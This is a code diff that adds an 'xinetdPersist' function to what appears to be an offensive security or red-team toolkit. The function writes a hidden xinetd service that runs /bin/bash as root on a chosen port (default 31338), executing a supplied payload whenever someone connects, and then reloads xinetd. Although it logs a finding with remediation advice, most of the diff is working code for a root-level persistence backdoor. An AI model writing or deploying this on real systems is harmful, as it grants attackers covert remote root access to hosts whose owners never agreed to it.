@@ -1032,8 +1032,63 @@ systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service sta
   }
 
   return { output: output.join("\n"), findings }
+}
 
-  return { output: output.join("\n"), findings }
+export async function xinetdPersist(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Xinetd Persistence ==="]
+  const payload = argVal(args, "--payload")
+  const port = argVal(args, "--port") || "31338"
+
+  const script = `
+echo "--- Xinetd Status ---"
+command -v xinetd >/dev/null 2>&1 && echo "[+] xinetd is available" || echo "[-] xinetd not installed"
+pgrep xinetd >/dev/null 2>&1 && echo "[+] xinetd is running" || echo "[-] xinetd not running"
+echo ""
+echo "--- Xinetd Services ---"
+ls -la /etc/xinetd.d/ 2>/dev/null || echo "[-] /etc/xinetd.d/ not found"
+echo ""
+${payload ? `
+echo "--- Installing Xinetd Service ---"
+if [ -d /etc/xinetd.d/ ] && ([ "$(id -u)" = "0" ] || [ -w /etc/xinetd.d/ ]); then
+  cat > /etc/xinetd.d/cs-svc << XINET
+service cs-svc
+{
+    type = UNLISTED
+    port = ${port}
+    socket_type = stream
+    protocol = tcp
+    wait = no
+    user = root
+    server = /bin/bash
+    server_args = -c "${payload}"
+    disable = no
+}
+XINET
+  echo "[+] Xinetd service installed on port ${port}"
+  kill -HUP $(pgrep xinetd) 2>/dev/null && echo "[+] xinetd reloaded" || echo "[-] Could not reload xinetd"
+else
+  echo "[-] xinetd not available or not writable"
+fi
+` : `echo "[*] Dry run — pass --payload <cmd> --port <port> to install."
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Xinetd service installed")) {
+    findings.push({
+      checkId: "LNX-XINETD-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "INSTALLED",
+      resource: `/etc/xinetd.d/cs-svc:${port}`,
+      title: "Xinetd persistence installed",
+      details: `Xinetd service listening on port ${port} — triggers payload on connection`,
+      remediation: "Remove /etc/xinetd.d/cs-svc and reload xinetd. Audit all xinetd service files.",
+    })
+  }
 
   return { output: output.join("\n"), findings }
 
